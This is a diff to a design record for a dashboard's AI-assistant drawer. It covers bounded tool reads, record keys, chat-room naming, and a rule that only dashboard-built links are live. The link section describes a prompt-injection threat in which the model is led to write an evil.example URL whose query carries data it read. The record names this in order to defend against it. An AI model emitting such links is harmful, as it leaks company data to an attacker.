@@ -2,7 +2,7 @@
 
 - **Status:** accepted
 - **Authority:** `internal/assistant/wire`
-- **Enforced-by:** `internal/assistant/catalog.TestEveryDefaultReadIsBounded`, `internal/assistant/catalog.TestAGenericListReadIsOnePage`, `internal/assistant/cards.TestARecordCarriesTheKeyProseWritesItBy`, `internal/assistant/cards.TestTheModelIsToldARecordsKey`, `internal/assistant/cards.TestAKeyedKindNeedsItsKeyAndNoOtherHasOne`, `internal/assistant/catalog.TestARecordIsKeyedTheWayTheAnswerNamesIt`, `internal/assistant/catalog.TestAReadTooLargeToShowIsNamedLinkedAndToldToTheModel`, `internal/assistant/catalog.TestACutReadTellsTheModelOnlyWhatTheEngineKnows`, `internal/assistant/catalog.TestEveryModelTextGoesThroughThePipeline`, `internal/assistant/catalog.TestEveryNarrowingArgumentNarrows`, `internal/assistant/catalog.TestAPageWithMoreIsNeverTheWhole`, `internal/assistant/wire.TestTheDashboardSpeaksTheAssistantProtocol`, and the dashboard's `mentions.test.tsx`, `reads.test.tsx`, `Thread.test.tsx`, `inert.test.tsx`, `components/InlineToken.test.tsx` (`checked links`) and `lib/markdown.test.tsx` (`prose`)
+- **Enforced-by:** `internal/assistant/catalog.TestEveryDefaultReadIsBounded`, `internal/assistant/catalog.TestAGenericListReadIsOnePage`, `internal/assistant/cards.TestARecordCarriesTheKeyProseWritesItBy`, `internal/assistant/cards.TestTheModelIsToldARecordsKey`, `internal/assistant/cards.TestAKeyedKindNeedsItsKeyAndNoOtherHasOne`, `internal/assistant/catalog.TestARecordIsKeyedTheWayTheAnswerNamesIt`, `internal/assistant/catalog.TestAReadTooLargeToShowIsNamedLinkedAndToldToTheModel`, `internal/assistant/catalog.TestACutReadTellsTheModelOnlyWhatTheEngineKnows`, `internal/assistant/catalog.TestEveryModelTextGoesThroughThePipeline`, `internal/assistant/catalog.TestEveryNarrowingArgumentNarrows`, `internal/assistant/catalog.TestAPageWithMoreIsNeverTheWhole`, `internal/assistant/catalog.TestTwoReadsOfOneToolAreToldApart`, `internal/assistant/catalog.TestAChatReadSaysTheRoomAsPeopleWriteIt`, `internal/assistant/catalog.TestAChatReadIsToldApartByWhatItAsks`, `internal/api/queries.TestTheAssistantsPageOfRoomsIsReadInOneStep`, `internal/assistant/wire.TestTheDashboardSpeaksTheAssistantProtocol`, and the dashboard's `mentions.test.tsx`, `reads.test.tsx`, `Thread.test.tsx`, `inert.test.tsx`, `components/InlineToken.test.tsx` (`checked links`), `lib/markdown.test.tsx` (`prose`) and `routes/chatlet/Room.test.tsx` (`a message's links`)
 - **Cost-when-tried:** the drawer drew a folded card for every read a turn made. An answer on the Inbox that read two tasks, a table and an agent, and then both tasks again, stood six cards of about 140px each between the reader and the answer in a 560px drawer, each saying its key twice (in its summary and as its link's label), and the same record twice. An answer on Company › Brand added a blue notice per read and table cards whose CSV, XLSX and link wrapped onto a second line or not depending on the length of the title.
 - **Tag-status:** unreleased
 
@@ -30,15 +30,16 @@ checked by the dashboard as every card's was.
 
 **No address the model writes is opened; a link the dashboard builds is.** The
 answer's words are read with `links: "checked"` (`lib/inlineTokens.ts`,
-`LinkMode`), the rule the Inbox reads an agent's words by too: a link is live
-only where the dashboard BUILT it, from parts it checked, to a place that is
-the company's. A key whose project is the company's opens its work item and a
-handle in the chart its seat, both app routes the dashboard writes; a
-reference, a commit or a repository opens the code host the company
-configured; and an address on a host the company configured (a code host,
-Jira, Confluence, Mattermost) opens as it is rebuilt from what it names
-(`<host>/<owner>/<repo>/pull/14`), with no query, fragment or anything else
-the model wrote. Every other address, an app route the model spelled among
+`LinkMode`), the rule the Inbox reads an agent's words by too, and Chatlet a
+message's links, whoever wrote the message: a link is live only where the
+dashboard BUILT it, from parts it checked, to a place that is the company's. A
+key whose project is the company's opens its work item, a handle in the chart
+its seat and the name of a room the reader may read its room, all app routes
+the dashboard writes; a reference, a commit or a repository opens the code
+host the company configured; and an address on a host the company configured
+(a code host, Jira, Confluence, Mattermost) opens as it is rebuilt from what it
+names (`<host>/<owner>/<repo>/pull/14`), with no query, fragment or anything
+else the model wrote. Every other address, an app route the model spelled among
 them, is drawn inert: its words and the host it names, readable and copyable,
 and never a control. A picture is its alt text, never fetched. The threat is
 a prompt injection that has the model write `https://evil.example/?q=<what it
@@ -47,11 +48,14 @@ link the dashboard built carries only a validated name or number to the
 company's own place.
 
 **A record carries the key prose writes it by.** `EntityCard.key` is a task's
-key or a project's, set from the record by its read's spec, never guessed from
-`subtitle`. A seat carries none: the prompt has the model name a seat by its
-name, never its handle, so a seat is found by its name. The model's digest of
-the card carries the key, and the prompt tells it to name each record exactly
-as its tools gave it, outside code.
+key or a project's, or a chat room's name with its `#` (`#launch`, an address
+written exactly, in lower case and never renamed), set from the record by its
+read's spec, never guessed from `subtitle`. A seat carries none: the prompt has
+the model name a seat by its name, never its handle, so a seat is found by its
+name. Nor does a direct conversation, which has no name: it is headed by its
+people, and words an answer writes about anybody are never its chip. The
+model's digest of the card carries the key, and the prompt tells it to name
+each record exactly as its tools gave it, outside code.
 
 **The matching rule** is stated once, in `mentions.ts`:
 
@@ -142,7 +146,19 @@ cut to fit the card) and `more` (rows past the page the read asked for), and
 a record its `items_total` (items cut to fit) and `items_more` (items past the
 page, a thread's older comments); the drawer says "first 20" on the chip and
 which screen shows the rest in the peek, and the model is told the count is a
-floor. The notice beside each shortened card is gone.
+floor. The notice beside each shortened card is gone. **A read is that one
+page and takes no cursor**: a page past the first would be a second read
+titled as the first, which the drawer, keeping one read per title or record,
+takes for the same read and keeps once. What lies past it is narrowed to (a
+search's words, its author) or read on the screen its card opens.
+
+**Two reads of one tool are two titles.** The drawer tells reads apart by a
+table's title and a record's kind and id, so every argument that changes what
+a read sends is said in its title's scope (`Tool.Scope`) or names its record;
+a room the call names by its id is said as the turn reads it, through the
+person's grant (`Tool.Room`), a direct conversation by its people.
+`catalog.TestTwoReadsOfOneToolAreToldApart` proves it for every read and
+every such argument, rather than holding a list of exemptions.
 
 **What narrows a read is an explicit list.** Each read declares `Tool.Narrow`,
 the arguments that ask for less (a search's words, a filter, a shorter
@@ -157,6 +173,13 @@ widening shape.
 real company before deciding: every dedicated read stayed under the step's 64
 KiB at its defaults (the largest, the token breakdown, 55 KB), and what crossed
 it were generic `api_request` reads of routes whose defaults are heavy. The
+chat reads that came after are bounded by their pages, and the rooms read by
+its size: the rail answers every room whole beside the person's whole read
+state, so `list_chat_rooms` asks for the fifteen most recently active, 58,116
+bytes with every field of every room and the read state at its cap
+(`queries.TestTheAssistantsPageOfRoomsIsReadInOneStep`), the rest of the step
+left for markup, which the encoding writes as six bytes to a `<`, `>` or `&`;
+the whole rail was past a step for a person in about sixty rooms. The
 routes' defaults stay their own: the dashboard and every other caller read them
 as they always have. The bound is applied by the assistant's read layer
 (`internal/assistant/catalog`), where its requests are built:
